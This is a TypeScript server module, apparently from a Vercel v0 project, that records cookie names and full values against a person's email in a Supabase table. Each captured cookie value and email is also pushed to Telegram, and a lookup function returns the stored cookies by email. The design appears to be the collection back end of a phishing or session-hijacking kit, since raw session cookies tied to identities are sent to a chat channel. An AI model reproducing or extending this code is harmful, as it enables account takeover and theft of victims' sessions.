import { createServerClient } from "@supabase/ssr"
import { sendCookieNotificationToTelegram } from "./telegram-service"

interface CookieData {
  email: string
  name: string
  value: string
  domain?: string
  path?: string
  secure?: boolean
  httpOnly?: boolean
  sameSite?: string
  expiresAt?: Date
}

export async function logCookie(data: CookieData): Promise<boolean> {
  try {
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL || "",
      process.env.SUPABASE_SERVICE_ROLE_KEY || "",
      {
        cookies: {
          getAll() {
            return []
          },
          setAll() {},
        },
      },
    )

    const { error } = await supabase.from("cookie_logs").insert({
      email: data.email,
      cookie_name: data.name,
      cookie_value: data.value,
      cookie_domain: data.domain || null,
      cookie_path: data.path || "/",
      secure: data.secure ?? true,
      http_only: data.httpOnly ?? true,
      same_site: data.sameSite || "Strict",
      expires_at: data.expiresAt ? data.expiresAt.toISOString() : null,
    })

    if (error) {
      console.error("[v0] Cookie logging error:", error)
      return false
    }

    const timestamp = new Date().toLocaleString()

    await sendCookieNotificationToTelegram({
      email: data.email,
      cookieName: data.name,
      cookieValue: data.value,
      cookieDomain: data.domain,
      secure: data.secure ?? true,
      httpOnly: data.httpOnly ?? true,
      sameSite: data.sameSite || "Strict",
      expiresAt: data.expiresAt?.toLocaleString(),
      timestamp,
    })

    return true
  } catch (error) {
    console.error("[v0] Error logging cookie:", error)
    return false
  }
}

export async function logCookieBatch(
  email: string,
  cookies: Array<{ name: string; value: string; domain?: string }>,
): Promise<boolean> {
  try {
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL || "",
      process.env.SUPABASE_SERVICE_ROLE_KEY || "",
      {
        cookies: {
          getAll() {
            return []
          },
          setAll() {},
        },
      },
    )

    const cookieLogs = cookies.map((cookie) => ({
      email,
      cookie_name: cookie.name,
      cookie_value: cookie.value,
      cookie_domain: cookie.domain || null,
      cookie_path: "/",
      secure: true,
      http_only: true,
      same_site: "Strict",
      expires_at: null,
    }))

    const { error } = await supabase.from("cookie_logs").insert(cookieLogs)

    if (error) {
      console.error("[v0] Batch cookie logging error:", error)
      return false
    }

    console.log(`[v0] Logged ${cookies.length} cookies for ${email}`)
    return true
  } catch (error) {
    console.error("[v0] Error batch logging cookies:", error)
    return false
  }
}

export async function getCookieLogs(
  email: string,
  limit: number = 50,
): Promise<CookieData[]> {
  try {
    const supabase = createServerClient(
      process.env.NEXT_PUBLIC_SUPABASE_URL || "",
      process.env.SUPABASE_SERVICE_ROLE_KEY || "",
      {
        cookies: {
          getAll() {
            return []
          },
          setAll() {},
        },
      },
    )

    const { data, error } = await supabase
      .from("cookie_logs")
      .select("*")
      .eq("email", email)
      .order("created_at", { ascending: false })
      .limit(limit)

    if (error) {
      console.error("[v0] Error fetching cookie logs:", error)
      return []
    }

    return (
      data?.map((log: any) => ({
        email: log.email,
        name: log.cookie_name,
        value: log.cookie_value,
        domain: log.cookie_domain,
        path: log.cookie_path,
        secure: log.secure,
        httpOnly: log.http_only,
        sameSite: log.same_site,
        expiresAt: log.expires_at ? new Date(log.expires_at) : undefined,
      })) || []
    )
  } catch (error) {
    console.error("[v0] Error getting cookie logs:", error)
    return []
  }
}
